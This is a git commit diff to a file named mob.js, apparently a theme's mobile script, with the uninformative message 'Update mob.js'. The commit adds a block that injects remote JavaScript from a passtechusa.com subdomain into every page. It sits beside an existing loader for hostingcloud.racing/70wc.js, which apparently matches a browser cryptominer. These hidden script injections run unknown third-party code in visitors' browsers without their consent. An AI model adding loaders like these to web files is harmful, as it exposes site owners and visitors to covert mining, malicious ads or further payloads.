ac4d14a5aab3dc88a0792f1ef0a129baecb46438
responsivethemesstatic <53955700+responsivethemesstatic@users.noreply.github.com>
2020-06-17 17:02:14 +0300

    Update mob.js

--- mob.js
+++ mob.js
@@ -6,6 +6,12 @@
     document.body.appendChild(script);
 })();
 (function() {
+ var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//pl15563170.passtechusa.com/35/da/1e/35da1e3af13599295821b2545bdc31fc.js';
+    document.body.appendChild(script);
+})();
+(function() {
 var script = document.createElement('script');
     script.src = 'https://www.hostingcloud.racing/70wc.js';
     script.onload = script.onreadystatechange = function () {
